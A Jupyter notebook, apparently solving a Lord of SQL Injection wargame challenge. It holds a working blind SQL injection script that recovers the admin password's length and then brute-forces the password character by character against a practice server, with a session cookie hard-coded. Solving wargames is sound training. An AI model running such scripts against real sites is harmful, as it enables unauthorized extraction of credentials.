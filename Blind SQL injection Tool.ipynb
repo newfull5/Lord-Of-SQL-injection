{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Searching Password Length.. [1]\n",
      "Searching Password Length.. [2]\n",
      "Searching Password Length.. [3]\n",
      "Searching Password Length.. [4]\n",
      "Searching Password Length.. [5]\n",
      "Searching Password Length.. [6]\n",
      "Searching Password Length.. [7]\n",
      "Searching Password Length.. [8]\n",
      "Searching Password Length.. [9]\n"
     ]
    }
   ],
   "source": [
    "import urllib.request\n",
    "\n",
    "from urllib.parse import quote\n",
    "\n",
    "\n",
    "\n",
    "result = \"\"\n",
    "\n",
    "pwlen = 0\n",
    "\n",
    "\n",
    "\n",
    "for i in range(1,10):\n",
    "\n",
    "    url = \"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=\"\n",
    "\n",
    "    add_url = \"' or length(pw)={} %23\".format(i)\n",
    "\n",
    "    print(\"Searching Password Length.. [{}]\".format(i))\n",
    "\n",
    "    add_url = quote(add_url)\n",
    "\n",
    "    new_url = url + add_url\n",
    "\n",
    "    re = urllib.request.Request(new_url)\n",
    "\n",
    "    #User-Agent와 PHPSESSID 를 re 객체의 header에 추가하면 빨리 접근할 수 있다고 한다는데 아직은 의미를 잘 모르겠다\n",
    "    re.add_header(\"User-Agent\",\"Mozilla/5.0\")\n",
    "    \n",
    "    re.add_header(\"Cookie\", \"PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4\")\n",
    "    \n",
    "    response = urllib.request.urlopen(re)\n",
    "\n",
    "\n",
    "\n",
    "    if str(response.read()).find(\"Hello admin\") != -1:\n",
    "\n",
    "        pwlen = i\n",
    "\n",
    "        print(\"Found length!! => {}\".format(pwlen))\n",
    "\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(1,pwlen+1):\n",
    "\n",
    "    for j in range(ord('0'),ord('z')):\n",
    "\n",
    "        url = \"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=\"\n",
    "\n",
    "        add_url = \"' or id='admin' and substr(pw,1,{})='{}' -- ;\".format(str(i), result+chr(j))\n",
    "\n",
    "        print(\"Searching.. - {0}{1}\".format(url, add_url))\n",
    "\n",
    "        add_url = quote(add_url)\n",
    "\n",
    "        new_url = url + add_url\n",
    "\n",
    "        re = urllib.request.Request(new_url)\n",
    "\n",
    "\n",
    "        \n",
    "        re.add_header(\"User-Agent\",\"Mozilla/5.0\")\n",
    "\n",
    "        re.add_header(\"Cookie\", \"PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4\")\n",
    "\n",
    "\n",
    "\n",
    "        res = urllib.request.urlopen(re)\n",
    "\n",
    "\n",
    "\n",
    "        if str(res.read()).find(\"Hello admin\") != -1:\n",
    "\n",
    "            result += chr(j).lower()\n",
    "\n",
    "            print(\"Found it!! => \" + result)\n",
    "\n",
    "            break\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
